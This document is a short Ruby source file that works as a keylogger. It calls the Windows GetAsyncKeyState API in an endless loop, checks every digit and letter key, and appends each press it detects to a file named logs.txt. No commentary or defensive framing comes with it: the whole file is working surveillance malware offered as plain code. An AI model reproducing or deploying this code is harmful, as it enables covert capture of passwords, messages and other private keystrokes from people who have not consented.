require 'Win32API'
 
def savefile(filename, text)
  file = File.open(filename, 'a')
  file.puts text
end
 
def capture
 
  api = Win32API.new("user32","GetAsyncKeyState",["i"],"i")
   
  while 1
   
    for num1 in (0x30..0x39)
      if api.call(num1) & 0x01 == 1 
        savefile("logs.txt", num1.chr())
      end
    end
     
    for num2 in (0x41..0x5A)
      if api.call(num2) & 0x01 == 1 
        savefile("logs.txt", num2.chr())
      end
    end
  end	
end
 
capture()
